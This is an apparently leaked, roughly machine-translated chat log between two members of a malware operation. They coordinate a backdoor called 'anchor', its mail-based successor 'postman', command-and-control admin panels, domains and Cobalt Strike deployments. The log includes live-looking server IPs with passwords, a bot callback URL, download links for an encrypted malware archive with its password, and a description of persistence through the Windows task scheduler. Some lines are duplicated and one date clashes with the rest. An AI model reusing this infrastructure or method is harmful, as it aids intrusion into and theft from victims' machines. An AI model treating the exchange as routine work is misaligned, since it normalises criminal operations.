[29.07.21 06:26:31] brooks: I'm totally rewriting it, hi
[04.08.21 05:51:51] brooks: hi, I'm in the import business, it's urgent
[04.08.21 05:52:38] brooks: importdll
[04.08.21 05:52:54] brooks: for superbrowser, looking for problems
[04.08.21 05:53:25] brooks: first - I have a ban on ActiveX and scripts in IE, probably the same on the test ones, everything is by default
[04.08.21 05:53:54] brooks: I'm looking forward to working it out today
[04.08.21 13:55:34] brooks: :)

[04.08.21 13:55:50] brooks: I have this
[04.08.21 13:56:09] brooks: it probably wasn't you
[04.08.21 13:56:38] rocco: it was ganesha server, confessed
[04.08.21 13:56:44] rocco: he'll prolong it
[04.08.21 13:57:23] brooks: he questioned him?
[04.08.21 13:57:31] brooks: :grin:
[04.08.21 13:58:10] rocco: text him if anything
[04.08.21 13:58:13] brooks: I thought you had a common payment panel somehow
[04.08.21 13:58:25] brooks: yes, I remembered it was him, I wrote
[04.08.21 13:58:44] rocco: yes if, there are these servers, I'm only responsible for mine
[04.08.21 13:58:55] rocco: otherwise you get lost
[04.08.21 13:59:46] brooks: yes it's a test, temporary, that's why I do not particularly stress about payment, if sylver did not know, just a new one would be ordered and checked how it turns out
[04.08.21 14:09:27] rocco: ) better for sylver not to hear it
[04.08.21 14:09:37] rocco: or I'll pout later
[04.08.21 14:25:14] brooks: so I write it here, not in general :)
[05.08.21 11:41:46] brooks: hi, before you go on vacation, tell Ganesh how you organize notification of the need for payment
[05.08.21 12:13:04] rocco: hi, demetrus is watching
[05.08.21 12:13:23] brooks: and ganesh? :)
[05.08.21 12:14:00] brooks: write me the right demetrus, I don't have it
[23.08.21 11:36:45] brooks: hi, when from vacation?
[24.08.21 04:32:43] rocco: Hi, I'm stuck, I'll be out soon
[24.08.21 08:59:08] brooks: we feel bad without you :(
[27.08.21 08:03:21] brooks: hi
[27.08.21 08:03:33] brooks: you're out of vacation?
[27.08.21 08:05:29] brooks: don't run away until you answer, please
[27.08.21 09:48:34] rocco: hi
[27.08.21 09:48:50] brooks: yeah, you made it
[27.08.21 09:48:57] brooks: when do you get off work?
[27.08.21 09:49:14] rocco: Still not all the way, I got sick
[27.08.21 09:49:17] brooks: server with zakrep admin died, need a new one, been waiting two weeks, demetrus can't make it
[27.08.21 09:49:22] rocco: I'll be fine on Monday
[27.08.21 09:49:40] rocco: Yeah, I know, I'll do it.
[27.08.21 09:49:42] brooks: ok, I wrote him to get a car right away, if you show up, I'll have to do it
[27.08.21 09:49:55] brooks: I'm ready to be drawn and quartered :(
[27.08.21 09:50:10] rocco: did you rebuild anchor?
[27.08.21 09:50:25] brooks: not yet, there are some small problems and defects
[27.08.21 09:50:31] brooks: I quit dns
[27.08.21 09:50:36] brooks: to mail
[27.08.21 09:50:48] brooks: there are still difficulties
[27.08.21 09:51:01] rocco: okay, good
[27.08.21 09:51:15] brooks: dns already lit up, that's why we're leaving
[27.08.21 09:51:23] brooks: to public soap servers
[27.08.21 09:52:34] brooks: go get medical treatment, you need healthy, cheerful, rested :)
[27.08.21 09:52:51] brooks: eager to fight your enemies :)
[27.08.21 09:52:53] rocco: I'm rested, just came back from 39 yesterday
[27.08.21 09:53:01] brooks: king and fatherland :)
[27.08.21 09:53:24] brooks: look, while I was working - didn't get sick, went on vacation - and here you are, 39
[27.08.21 09:53:28] brooks: what conclusions?
[27.08.21 09:53:39] brooks: you shouldn't go on vacation :) :) ")
[27.08.21 09:53:43] brooks: :)
[27.08.21 09:53:43] rocco: you can see the conclusions.
[27.08.21 09:54:05] rocco: probably overbought
[27.08.21 09:54:24] brooks: did you rest on the south shore of the white sea?
[27.08.21 09:54:38] brooks: it's warm on the north shore of the black sea
[27.08.21 09:55:11] rocco: I was in the Crimea, it's probably okay with the air conditioning
[27.08.21 09:55:21] brooks: not a word about the red one, it's like fresh milk
[27.08.21 09:55:40] brooks: The air conditioner is evil
[27.08.21 09:56:06] brooks: Go get cured, I'll go torture anchor
[27.08.21 09:56:24] rocco: yeah
[30.08.21 07:36:23] rocco: brooks: hi, which anchor there, what domains were on it?
[30.08.21 07:37:19] brooks: hi
[30.08.21 07:37:27] brooks: the car was this https://217.12.201.100:9758
[30.08.21 07:37:43] brooks: my domains are majestig.com
visioblum.com
[30.08.21 07:38:33] brooks: as I understood, the machine got into abuse and no access to admin
[30.08.21 07:38:46] brooks: i think you just need to redo it and send pads to it
[30.08.21 07:38:59] rocco: yeah
[30.08.21 07:39:08] brooks: demetrius tried to take data from it, but I don't know if it worked or not
[30.08.21 07:39:37] rocco: let me try to fix it
[30.08.21 07:56:27] rocco: does Prof need anchor too?
[30.08.21 07:57:04] brooks: I don't know, they keep quiet about new ones, they need to fix this problem
[30.08.21 09:08:49] brooks: I don't know, no one is talking about new ones, fix this problem
[30.08.21 09:09:12] brooks: I don't know, no one's talking about new ones, need to fix this problem
[30.08.21 09:30:41] brooks: ?
[30.08.21 10:41:14] brooks: ?
 prof also need anchor?
7:57 AM
I don`t know, they`re not saying anything about new ones, need to fix this problem

in case you haven't seen
[30.08.21 10:41:24] brooks: any results?

[30.08.21 10:42:17] brooks: if you have not seen
any results?
[30.08.21 10:43:05] rocco: he needs a new setup
[30.08.21 10:43:15] rocco: maybe not
[30.08.21 10:43:19] rocco: I'll see
[30.08.21 10:43:32] rocco: but it needs a new server and VPS for domains
[30.08.21 10:43:40] brooks: as I understand, you need to raise admin panel and redirect pads
[30.08.21 10:43:58] brooks: did everything die there, or just the admin server?
[30.08.21 10:44:27] rocco: probably all
[30.08.21 10:44:40] rocco: The names remained
[30.08.21 10:45:07] brooks: ok, then don't change domain names, so you can keep the set pins in place
[30.08.21 10:46:36] rocco: he had nothing there, I asked him 2 months ago if he had to renew it, they never answered
[30.08.21 10:46:58] brooks: :sob:
[30.08.21 10:47:08] brooks: should have renewed it (
[30.08.21 10:47:28] brooks: ok, then do it all over again with the same domains (
[30.08.21 10:47:37] rocco: yes
[30.08.21 10:48:03] rocco: I'm trying to get the server up now, I'll get the anchor done
[30.08.21 10:48:39] brooks: okay, but I have to do it today, otherwise come to the wake :(
[30.08.21 10:49:10] rocco: which one? the first one or the pro?

[01.09.21 07:03:23] brooks: :( pity
[01.09.21 07:03:45] rocco: i think today
[01.09.21 07:03:53] brooks: :)
[01.09.21 12:21:53] rocco: bro you were talking about aprof and socket?
[01.09.21 12:22:08] rocco: they ask for anchor?
[01.09.21 12:22:16] rocco: or each separately?
[01.09.21 12:22:32] rocco: rocco: are outlet asking for 20 dns domains?
[01.09.21 12:23:00] rocco: ``
 Can I have a separate panel with 20 domains?
rocco is asking for
anchor

```
[01.09.21 12:31:34] brooks: read
[01.09.21 12:32:05] brooks: as I understand, you need to make one admin panel for 20 domains, but I do not understand, 10 + 10 reserve, or 20 + 20 reserve
[01.09.21 12:32:20] brooks: so he could see everything in one panel
[01.09.21 12:32:50] brooks: let's do it, register domains, I will check whether it is 10 +10 or 20 +20
[01.09.21 12:34:14] rocco: now I will make anchor group, find out who of our admins is not too busy, someone will put on the anchor, because it all should monitor constantly
[01.09.21 12:34:32] rocco: I'll train them to do it without me
[01.09.21 12:34:34] brooks: ok, teach someone, or better two
[01.09.21 12:34:59] rocco: ok
[01.09.21 12:35:16] rocco: otherwise sylver told me the same thing
[01.09.21 12:36:30] rocco: and that yesterday's anchor to whom?
[01.09.21 12:36:51] rocco: or was it different?
[01.09.21 12:37:39] brooks: was also a socket
[01.09.21 12:37:55] brooks: his admin panel died, it was changed
[01.09.21 12:38:14] brooks: register 20 domains, we do 10 pairs total
[01.09.21 12:38:31] rocco: what's he complaining about?
[01.09.21 12:39:14] brooks: i don't know, i don't know who's rosette, or who's ali, nicknames change everywhere, i forget who is who if we don't communicate for a long time
[01.09.21 12:39:58] brooks: I did send mails via smtp, and data coding :)
[01.09.21 12:39:59] rocco: this is bullshit, and then I get a message and you can't tell who it's from
[01.09.21 12:40:04] brooks: I'm working on an imap
[01.09.21 12:40:11] rocco: great
[01.09.21 12:40:43] brooks: I'm reading the list of emails, now I'll decrypt the entries, and all that's left is to get the attachment and the text of the email
[01.09.21 12:41:02] brooks: when I'll show off, I'll tell you what I'll do next :)
[01.09.21 12:41:23] rocco: will the same technology also come to this admin?
[01.09.21 12:41:28] brooks: the things that come - this is our position :(
[01.09.21 12:41:44] brooks: yes, I will make it so the admin area does not change
[01.09.21 12:41:53] rocco: fine
[01.09.21 12:41:53] brooks: and you can also run it for other projects
[01.09.21 12:42:09] rocco: this admin panel is really handy
[01.09.21 12:42:52] brooks: there will also be a Linux server, but you will have to specify in the config file mail addresses the program will work with
[03.09.21 07:45:47] rocco: brooks: Hi, how many of us use anchor?
[03.09.21 07:46:22] brooks: well you asked, I have no idea, but we did for ali, sockets, and socket 10 more ordered
[03.09.21 07:46:26] brooks: that's all I can do
[03.09.21 07:46:29] brooks: and hi :)
[03.09.21 07:47:27] brooks: and those who did a long time ago - I do not know, if you support payment - you can go to the admin - and you will see, there are the dates of the bounce?
[03.09.21 07:48:07] rocco: okay, I'll look
[03.09.21 07:48:45] brooks: I work by the principle - done, handed over, forgot about it until you get kicked
[07.09.21 09:44:01] brooks: hi, did angelo text you yesterday?
[07.09.21 09:50:41] rocco: hi, I know who for
[07.09.21 09:51:02] brooks: ok, I won't interfere then, if you need something to check, just write
[07.09.21 09:53:32] rocco: I want others to learn, Ben managed to run the admin, now I'll teach the rest, waiting for the registrars as always, this is pepez
[07.09.21 09:53:49] rocco: it takes 30 minutes to register and buy everything
[07.09.21 09:53:52] brooks: :)
[07.09.21 09:54:00] rocco: already not enough anger
[07.09.21 09:54:10] brooks: exhale
[07.09.21 09:54:36] brooks: tell recruiters what you think of them, they hire people :)
[07.09.21 09:55:15] rocco: i already complained to adam yesterday that they can't even register fast enough, not to mention configure anything
[07.09.21 09:55:50] brooks: and what adam - sympathized or went off into the sunset?
[07.09.21 09:56:59] rocco: no started to adjust, well, yesterday was a big order for cob servers, and I here was half a day waiting for them to register, then already defu started to complain, like overclocked on time
[08.09.21 07:07:11] rocco: Hey, did you anjelo throw the old anchor files? did not clean them?
[08.09.21 07:08:49] brooks: no, what i had, i think i gave them to the outlet as well, and i took them from angelo
[08.09.21 07:09:01] rocco: got it
[08.09.21 09:19:31] brooks: knock, knock.
[09.09.21 08:25:04] brooks: hi
[09.09.21 08:25:15] brooks: hi
[09.09.21 08:25:42] brooks: who of yours can bring up a mail server? need imap ? smtp
[09.09.21 08:26:00] brooks: imap & smtp
[09.09.21 08:26:42] rocco: hi
[09.09.21 08:27:03] rocco: in group admins silva ask, now we'll put it on someone
[09.09.21 08:27:27] brooks: well, it's the same thing
[09.09.21 08:27:57] rocco: is that for you?
[09.09.21 08:28:10] rocco: you want some kind of pop smtp server?
[09.09.21 08:28:15] rocco: for tests
[09.09.21 08:28:18] rocco: ?
[09.09.21 08:28:41] brooks: yes, debugging first
[09.09.21 08:28:55] brooks: not pop, imap, and better with security
[09.09.21 08:30:25] brooks: sylver offers to work not on public mailers, but on theirs
[09.09.21 08:30:56] rocco: yeah yeah sure
[09.09.21 08:31:02] rocco: let's do it
[09.09.21 08:31:07] rocco: you could have done it yourself
[09.09.21 08:31:22] rocco: but I can't disperse it with anchor or cobalt
[09.09.21 08:31:22] brooks: there is an option to raise TLS, but I think it's better to use a closed channel
[09.09.21 08:31:52] brooks: let them do it, I don't have everything ready yet, but knowing the speed of work, I'm already worried :)
[09.09.21 08:35:59] rocco: yeah, sure, not fast there either
[09.09.21 08:36:53] brooks: I guess, it's only from the management's point of view - what to do there? once and done :(
[09.09.21 08:36:57] rocco: brooks: listen, I raised the anchor for myself, the domains remained that I used to use, in the admin came bots that previously hung, but do check nimhera not come
[09.09.21 08:37:12] rocco: old anchors are knocking
[09.09.21 08:37:24] brooks: what do you mean, I do the check?
[09.09.21 08:37:47] rocco: well your checkcomm software
[09.09.21 08:38:06] brooks: does it hang or error?
[09.09.21 08:39:32] brooks: I'll go eat and look at each stage, where the problem occurs, but if there is a knockback from other instances, it should work
[09.09.21 08:40:03] rocco: like forbidden
[09.09.21 08:40:16] rocco: doesn't reach admin
[09.09.21 08:40:22] rocco: old anchors are knocking
[09.09.21 08:40:28] rocco: in the admin area
[09.09.21 08:40:31] brooks: no, it's impossible
[09.09.21 08:40:48] rocco: that's what I think
[09.09.21 08:40:50] brooks: ok, give me half an hour, all thoughts about food :)
[09.09.21 08:40:57] rocco: I'll try to run anchor from dedik
[09.09.21 08:41:10] brooks: went out, I'll knock when I come back
[09.09.21 08:41:16] rocco: okay, I'll handle it, maybe admin is slow again
[09.09.21 09:29:12] brooks: here
[14.09.21 16:03:45] brooks: hi
[14.09.21 16:04:09] rocco: hi
[14.09.21 16:04:12] rocco: wrote?
[14.09.21 16:04:16] brooks: Yeah.
[14.09.21 16:05:36] brooks: can you make me a kit to test the transport of soap and intermediate version of anchor? admin, padding, linux server for anchor component, you need to configure admin and padding
[14.09.21 16:05:53] brooks: on the linux server I'll install the prog myself
[14.09.21 16:06:27] rocco: so you need a set of server-admin, padding and vpc with debian?
[14.09.21 16:06:35] brooks: yeah.
[14.09.21 16:06:42] rocco: what kind of deb?
[14.09.21 16:06:52] brooks: go for the latest
[14.09.21 16:07:08] brooks: I'll try to make a static build to have less problems with the libs
[14.09.21 16:07:37] rocco: go for 10, it seems to be everywhere now, 11 is not everywhere yet
[14.09.21 16:07:46] brooks: ok
[15.09.21 08:21:02] brooks: hi, and 10 sets were made for the socket - have you already given?
[15.09.21 08:30:30] rocco: hi, I remember, I'll pick it up today
[15.09.21 08:31:09] brooks: slice wants another set
[15.09.21 08:31:43] rocco: ancora? on dns?
[15.09.21 08:31:53] brooks: yeah
[15.09.21 16:37:58] rocco: brooks, your kit is almost done, I'll test it now
[15.09.21 16:38:10] brooks: :)
[15.09.21 16:39:26] rocco: I'll tie the domain to the cpu to test the connection
[15.09.21 16:39:42] brooks: I don't need a domain :)
[15.09.21 16:40:10] rocco: I know, I'll untie it later.
[15.09.21 16:40:21] brooks: okay, no problem
[15.09.21 16:49:38] brooks: what about the outlet? It's getting embarrassing, how we've been working for two weeks
[15.09.21 16:49:39] brooks: what about the outlet? It's getting embarrassing, we've been pulling for two weeks
[15.09.21 16:51:15] rocco: is he asking?
[15.09.21 16:51:24] rocco: I'll try to make him one tomorrow.
[15.09.21 16:51:32] rocco: not enough hands
[15.09.21 16:51:41] rocco: trying to teach
[15.09.21 16:51:47] brooks: not asking, but pulling
[15.09.21 16:52:08] brooks: ask, I don't know what to say
[15.09.21 16:52:22] rocco: yes I remember, but I haven't taken out all week with these cobs
[15.09.21 16:52:44] brooks: yada
[15.09.21 16:52:50] rocco: now they gotta give me a second server with addin, then he will be fine
[15.09.21 16:53:00] brooks: I don't even bother, just to see what's up
[15.09.21 17:31:02] brooks: ``
Yes we don't use it much, in fact, it cuts it in static or at the moment of checking through the checkbox -u on real machines
Alas, it's very fucked up at the moment, waiting for an update.

[16.09.21 16:43:45] brooks: well rocco asked for 10 sets
[16.09.21 16:43:54] brooks: you started making them, but no results yet
[16.09.21 16:43:57] rocco: 10 domains
[16.09.21 16:44:14] rocco: or 10 sets
[16.09.21 16:44:20] rocco: that's fucked up
[16.09.21 16:44:20] brooks: 10 sets, we do two domains per set
[16.09.21 16:44:34] brooks: we've been doing it for over a week already :)
[16.09.21 16:44:49] brooks: you even created a group for it and started teaching it
[16.09.21 16:45:02] rocco: shit, I don't even know how to distribute everything
[16.09.21 16:45:23] rocco: created yes, ben got it up
[16.09.21 16:45:28] rocco: I gave it to you
[16.09.21 16:45:42] rocco: tomorrow I'll bring it up again, let them do it
[16.09.21 16:45:45] brooks: that's one for debugging new transport
[16.09.21 16:46:24] rocco: i'm just in another group teaching coba, they also have orders every week
[16.09.21 16:46:31] rocco: but I'm kind of trained.
[16.09.21 16:46:38] rocco: now I'll use anchor
[16.09.21 16:47:13] brooks: wait, don't kick me yet, just teach me, I will get a new one with new transport, and I will clean up the old one, let it work too
[16.09.21 16:47:49] rocco: no need to train me, I can't physically take it all out
[16.09.21 16:48:25] rocco: you know, 10 sets, that's all you have to do, buy, raise, debug
[16.09.21 16:48:51] brooks: Yeah.
[16.09.21 16:49:13] brooks: you can raise them up in principle, they won't go sour, only you'll need some money for maintenance
[16.09.21 16:49:56] rocco: here's more content, you need someone to put only anchors to watch
[16.09.21 16:50:13] brooks: train at least two
[16.09.21 16:50:15] rocco: kobas they are disposable, work and throw away, give me new ones

[22.09.21 09:37:51] brooks: hi, it's coming along, but with a delay
[22.09.21 09:38:16] brooks: i thought i would test it by the weekend, but i had to remove libraries i was pulling down with openssl
[22.09.21 09:38:34] brooks: i think i've done everything, i'll start testing today
[22.09.21 09:38:39] rocco: ruben built a deb package for the admin area
[22.09.21 09:38:54] rocco: so you won't need ansible either
[22.09.21 09:39:08] rocco: only the second part is left to set up
[22.09.21 09:39:14] brooks: ok, only the client will be cleaned, I think it will still be used
[27.09.21 08:04:02] brooks: knock-knock
[28.09.21 04:45:47] brooks: hi, I missed you all day yesterday :)
[28.09.21 04:46:01] brooks: I have a problem transferring data to admin
[28.09.21 04:46:12] brooks: it says protocol is unsupported
[28.09.21 04:47:54] rocco: where's the problem? in admin?
[28.09.21 04:48:08] brooks: either on it, or on the pad
[28.09.21 04:48:17] brooks: I think so
[28.09.21 04:49:13] rocco: and curl what exactly writes?
[28.09.21 04:49:21] rocco: maybe something's wrong with him
[28.09.21 04:49:32] brooks: unsupported protocol
[28.09.21 04:49:37] brooks: it didn't seem to fail before
[28.09.21 04:50:14] brooks: go to server, there's a file in tmp with message and string to send
[28.09.21 04:50:52] rocco: maybe the admin panel is glitchy again, it happens that the crlang is badly assembled, and does not receive data
[28.09.21 04:51:20] brooks: take a look, I already wanted to send everything to Angelo for testing yesterday, and it failed
[28.09.21 04:54:09] rocco: yeah, I'll take a look, hurry up to run everything
[28.09.21 04:56:13] rocco: brooks, send me all the data from the servers, I can't find it

[28.09.21 04:57:37] rocco: funny
[28.09.21 04:57:44] brooks: and why is it so bad - because chicks are Evil

[28.09.21 04:58:27] rocco: got married )
[28.09.21 04:58:52] brooks: the main thing you should not tell him, that you married him off :)
[28.09.21 04:59:06] rocco: :laughing:
[28.09.21 05:02:45] rocco: and how did you check, some file?
[28.09.21 05:02:48] rocco: you can check it now
[28.09.21 05:03:01] rocco: see if it goes to the admin area
[28.09.21 05:03:29] brooks: not as fast as I would have liked
[28.09.21 05:03:45] brooks: set everything up, and I'll run it and see

[28.09.21 15:49:45] brooks: the request is like this
[28.09.21 15:49:51] rocco: that's how this port works
[28.09.21 15:50:00] rocco: so software went directly through?
[28.09.21 15:50:04] brooks: yes
[28.09.21 15:50:07] rocco: from software
[28.09.21 15:50:10] rocco: Yeah.
[28.09.21 15:50:18] brooks: adjust the pad
[28.09.21 15:50:32] rocco: Yeah, but I can't make it today.
[28.09.21 15:51:22] brooks: it's up to you, you won't make it in time, but tomorrow it would be better to check it before sylvester arrives
[28.09.21 15:52:45] rocco: yeah, I will
[29.09.21 05:07:23] brooks: hi, if you come, knock, we'll deal with it

[29.09.21 05:27:04] rocco: I'll turn on debug mode now

[29.09.21 05:30:17] rocco: let's go with software
[29.09.21 05:30:29] brooks: let's try it now
[29.09.21 05:33:11] rocco: it worked
[29.09.21 05:33:22] brooks: I see, but yesterday was forbidden
[29.09.21 05:33:30] brooks: you can see it in the logs
[29.09.21 05:34:02] rocco: well, it's all quantum mechanics, when I observe everything works
[29.09.21 05:34:36] rocco: Give it to Angelo, let him test it
[29.09.21 05:34:59] rocco: yeah, let's get it ready for release
[29.09.21 05:36:48] rocco: I'll run it in the demon
[29.09.21 05:38:21] brooks: wait, who are you going to run as a demon?
[29.09.21 05:38:41] rocco: Yerlang, I already launched
[29.09.21 05:39:38] brooks: ok, when you run it in battle mode, give me a call, I'll check the turn off again and give it to angelo to check
[29.09.21 05:39:52] rocco: go ahead
[29.09.21 05:41:27] rocco: I'm here
[29.09.21 05:41:59] brooks: I went on with the code - requesting the load
[29.09.21 05:42:19] brooks: I'll wait 5 minutes for the answer, and then I'll check the bounce again
[29.09.21 05:42:25] rocco: yeah
[29.09.21 05:42:28] brooks: and yesterday I got an error on the admin
[29.09.21 05:42:59] rocco: you should have stayed in debug mode maybe
[29.09.21 05:43:20] brooks: I logged out, logged back in, everything is still working
[29.09.21 05:43:38] brooks: and another question
[29.09.21 05:44:06] brooks: ``
https://194.76.227.21/lackey/QAZWSX_W629200.122DCAAE2E392BD90E2B20BB0DB9AF05/0/Windows_8_x64/1001/0.0.0.0/2462330A94264E82002C5007824BEAE6DD3D553D91B7EDAB716B054B4BC099C7/iUuRDbPXuiIRUXEYg8FhyuTchd7MzchV/
```
this is the bounce line
[29.09.21 05:44:21] brooks: 122DCAAE2E392BD90E2B20BB0DB9AF05 - this is the ID of the program
[29.09.21 05:44:28] brooks: I don't see it in admin
[29.09.21 05:45:05] brooks: for lightancore it's not important, but for normal, when you need to delete it should specify 122DCAAE2E392BD90E2B20BB0DB9AF05, where do you see it in the admin area?
[29.09.21 05:45:26] rocco: this is a feature of admin, we figured it out, you have to delete this line from history, then it will be displayed differently
[29.09.21 05:45:50] rocco: look at the time
[29.09.21 05:45:50] brooks: okay, if you know it, it's okay
[29.09.21 05:46:20] rocco: we were wondering why the same string is displayed
[29.09.21 05:46:37] rocco: it's from your receipt
[29.09.21 05:46:51] rocco: the first received it says so
[29.09.21 05:47:06] rocco: you have to clean it out of the database
[29.09.21 05:47:26] rocco: or remove from admin and restart
[29.09.21 05:47:34] brooks: just hackers wrote a month ago, that delete did not work, and I think, maybe entered the wrong thing?
[29.09.21 05:48:15] rocco: hmm strange, I seem to delete everything, I need to check
[29.09.21 05:48:40] rocco: most likely a bug with the database and admin
[29.09.21 05:48:45] brooks: if you set a wrong ID, it won't go away
[29.09.21 05:49:00] brooks: not from admin, but from the anchor itself
[29.09.21 05:49:03] rocco: yes it can
[29.09.21 05:49:25] rocco: shit, it needs to be deleted
[29.09.21 05:49:33] brooks: i just look at the admin entry and do not understand how to set the self-delete
[29.09.21 05:49:54] brooks: I deleted it, now check again
[29.09.21 05:50:57] rocco: if you press delete all dead in the system tab, it will clean up fine
[29.09.21 05:51:15] brooks: I see it, I'll get another answer and we'll consider it okay to transfer Angelo
[29.09.21 05:51:17] rocco: it works fine there
[29.09.21 05:51:31] brooks: in the admin panel itself, yes, I delete without any problems
[29.09.21 05:51:55] rocco: yeah, there's a bug, keep an eye on it
[29.09.21 05:52:25] rocco: it's more likely the id is not properly set in the south
[29.09.21 05:52:30] rocco: in the database
[29.09.21 05:52:53] brooks: yes
[29.09.21 05:53:42] rocco: we have postgres experts, you can hook it up later
[29.09.21 05:54:14] brooks: yeah, I think there's something wrong with the passed string
[29.09.21 05:54:30] brooks: or it's decrypted/encrypted somehow
[29.09.21 05:55:14] rocco: well, if you look at the erlang log, it comes correct, but in the admin panel the old one is displayed
[29.09.21 05:55:43] brooks: in any case, the problem is on the admin side
[29.09.21 05:55:46] rocco: okay, let's keep track
[29.09.21 05:56:04] brooks: it doesn't matter for this program, but for anchor you'll have to solve the problem
[29.09.21 05:56:18] brooks: at first it didn't work, because there were spaces in the address bar
[29.09.21 05:56:36] brooks: I think that's why many anchors didn't work, I copied the code one to one
[29.09.21 05:57:08] rocco: So there was an error before, too?
[29.09.21 05:57:16] brooks: yes
[29.09.21 05:57:23] brooks: and it didn't get caught in the test
[29.09.21 05:57:32] rocco: hmmm I see
[29.09.21 05:57:45] brooks: I replaced the spaces with '_' and it worked
[29.09.21 05:57:45] brooks: \
[29.09.21 05:57:53] rocco: well, that's what it means to rebuild the project
[29.09.21 05:58:06] brooks: and when you checked it with your browser - it might have changed the blanks to %20 by itself
[29.09.21 05:58:18] rocco: yeah right
[29.09.21 05:58:22] brooks: well, not to rebuild, but to fork a new version
[29.09.21 05:58:24] rocco: browser changes
[29.09.21 05:58:35] brooks: yeah, there's kind of no problem
[29.09.21 05:59:15] brooks: okay, I'm going to clean up the code, remove logs, and write a love letter to angelo, what works and how to check
[29.09.21 05:59:24] rocco: yeah
[29.09.21 05:59:52] brooks: as for the installation - i think i built it for curl4, i couldn't build it statically, i have to install it
[29.09.21 06:00:11] rocco: from sources?
[29.09.21 06:00:18] brooks: the other libraries seem to be statically linked, I hope that we will not put anything else
[29.09.21 06:00:35] brooks: yes, there are sources on the machine
[29.09.21 06:01:06] rocco: okay, I'll do ansible to build the server
[29.09.21 06:01:07] brooks: i.e. let's try a working version, and see what it will take besides curl
[29.09.21 06:01:25] brooks: and for anchor did you have someone make a deb package?
[29.09.21 06:01:36] brooks: maybe better, and sylver will be satisfied :)
[29.09.21 06:01:36] rocco: yes, Ruben does
[29.09.21 06:01:48] rocco: kinda did it already
[29.09.21 06:01:51] brooks: after testing, let's stress him
[29.09.21 06:02:03] brooks: seems not complicated, I read how to make them
[29.09.21 06:02:09] rocco: ah for the adeb server?
[29.09.21 06:02:15] rocco: sure, go ahead
[29.09.21 06:02:21] brooks: just to deploy the server with one command
[29.09.21 06:02:32] rocco: you can do it without me
[29.09.21 06:02:37] brooks: but there will be a config file, you will have to build it very carefully
[29.09.21 06:02:49] brooks: and there will be problems with mailboxes
[29.09.21 06:03:25] brooks: you may have to confirm that you can receive mail from certain addresses and send it to those addresses (where the module is installed), but that's for google
[29.09.21 06:03:33] brooks: mail.com doesn't seem to require that
[29.09.21 06:03:58] rocco: that's where we'll sit for now
[29.09.21 06:03:59] brooks: mitz gave me his mail server, he has no such problems
[29.09.21 06:04:19] brooks: but I think public ones are preferable
[29.09.21 06:04:36] rocco: yes, for transportation, of course
[01.10.21 05:37:02] rocco: brooks: hi, did you test it?
[01.10.21 05:37:26] brooks: hi
[01.10.21 05:37:29] brooks: I think not yet
[01.10.21 05:37:36] brooks: didn't text me anything yesterday
[01.10.21 05:37:43] brooks: I edited his code a bit
[01.10.21 05:37:49] brooks: gave it to him yesterday afternoon
[01.10.21 05:37:55] brooks: no results yet
[01.10.21 05:38:18] brooks: but this version is light, like sylver wrote, it will be run by a bot, the module itself must be kept in the registry
[01.10.21 05:38:19] rocco: got it, ask him
[01.10.21 05:38:30] brooks: I'm working on the main one
[04.10.21 09:58:16] brooks: listen, we were supposed to give out a set of anchors for the slice, one
[04.10.21 09:58:26] brooks: do we have it or did everyone forget
[04.10.21 10:07:32] rocco: so let's give it out with a new anchor
[04.10.21 10:36:02] brooks: reminded
[04.10.21 10:36:17] brooks: still no separate insta?

    brooks
    September 15, 2021
    @slice ordered
[04.10.21 10:37:39] rocco: Yes, you can, but is it worth it while there is no new anchor?
[04.10.21 10:37:50] rocco: the old one sticks out badly
[04.10.21 10:40:34] brooks: I don't know.
[04.10.21 10:41:46] brooks: I'm gonna try to pass judgment.
[04.10.21 10:45:37] brooks: stand down :)
[04.10.21 10:53:25] rocco: condemned?
[04.10.21 10:53:40] rocco: :face_with_monocle:
[03.11.21 06:22:31] brooks: hi
[03.11.21 06:23:06] rocco: hi
[03.11.21 06:23:56] brooks: see how to deploy the server part of postman
[03.11.21 06:24:09] brooks: so you won't have any questions, I'll be gone for a while
[03.11.21 06:24:30] brooks: so I can answer all your questions
[03.11.21 06:25:02] rocco: so, what's the postman?
[03.11.21 06:25:10] rocco: that's where to the anchor?
[03.11.21 06:25:18] brooks: new anchor
[03.11.21 06:25:29] brooks: that works through mailboxes
[03.11.21 06:25:47] brooks: 170.130.165.62
5ba5a7be0b
[03.11.21 06:26:11] rocco: got it, is it the part that deploys on vpc?
[03.11.21 06:26:25] brooks: in /home are the sources, the file Makefile lists all the required libraries, ie what you need to install
[03.11.21 06:26:28] brooks: yes
[03.11.21 06:26:43] brooks: the windup doesn't concern you, if you want - I'll give you one too
[03.11.21 06:27:23] rocco: and what have you decided? shall we put it through cobalt?
[03.11.21 06:27:47] brooks: I don't know this point, the code was rewritten completely, i.e. it must not stain
[03.11.21 06:28:31] rocco: And can you also send me the anchor itself, which is already built on the wind, please?
[03.11.21 06:28:44] brooks: but it works like the old one, it writes itself into the scheduler, into a random folder, adds "Task" to the folder name, if there is such a task, it tries other suffixes
[03.11.21 06:28:52] rocco: I'll talk to sylver, maybe start it already
[03.11.21 06:29:03] brooks: can i give you access to git, or can i throw you an archive?
[03.11.21 06:29:14] rocco: go ahead
[03.11.21 06:29:21] brooks: it's time, angelo should have checked that the fixing works
[03.11.21 06:29:26] brooks: I'll throw it
[03.11.21 06:44:29] brooks: https://gofile.io/d/ZgGfa6
[03.11.21 06:44:36] brooks: 0.rar.pgp
[03.11.21 06:44:43] brooks: archive password - 1
[03.11.21 06:45:19] brooks: delegate - complete anchor with anchoring, postman - the same, but it is not anchored and constantly hangs in memory
[03.11.21 06:45:39] brooks: the server part is the same, in postman.linux
[03.11.21 06:46:21] brooks: the code is slightly different from what is now deployed on the server, I was finalizing for the llvmo build, so it's better to keep it too
[03.11.21 06:46:47] brooks: there's a readme there, see how clear it is
[03.11.21 07:44:22] rocco: can't decipher it
[03.11.21 07:45:03] rocco: can you try again
[03.11.21 07:48:23] rocco: shit, vpc doesn't work
[03.11.21 07:56:04] brooks: I'll do it
[03.11.21 08:26:12] brooks: didn't uplink?
[03.11.21 08:32:15] brooks: https://file.io/bLosMIaenxXq
[03.11.21 08:38:17] rocco: i couldn't find any traces of it
[03.11.21 08:38:28] rocco: only address and pass, and where he registered it is unclear
[03.11.21 08:38:34] rocco: let's make a new one
[03.11.21 08:38:50] rocco: unwrap everything, and I'll look at the history
[03.11.21 08:39:10] rocco: sylver gave the okay to deploy from cobalt
[03.11.21 08:39:21] rocco: so I'm busy today
[03.11.21 08:39:32] rocco: when do you want to leave?
[03.11.21 08:39:38] rocco: will you be there today?
[03.11.21 08:39:48] rocco: I have to work it off.
[03/11/2011 08:58:49] rocco: 170.130.55.252 2d2924026a
